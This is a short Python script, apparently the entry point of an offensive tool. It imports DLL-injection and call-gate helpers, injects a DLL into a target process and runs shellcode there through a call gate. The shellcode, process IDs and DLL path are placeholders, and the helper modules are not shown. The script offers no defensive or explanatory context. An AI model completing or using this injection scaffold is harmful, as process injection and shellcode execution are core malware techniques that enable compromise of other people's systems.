from call_gate import create_call_gate
from dll_injector import inject_dll

def main():
    target_process_id = 1234  # Replace with the actual target process ID
    target_thread_id = 5678   # Replace with the actual target thread ID
    shellcode = b"\x90" * 100  # Replace with actual shellcode
    dll_path = "C:\\path\\to\\your\\dll.dll"  # Replace with the actual DLL path

    # Inject DLL into the target process
    inject_dll(target_process_id, dll_path)

    # Create a call gate and execute shellcode in the target process
    create_call_gate(target_process_id, target_thread_id, shellcode)

if __name__ == "__main__":
    main()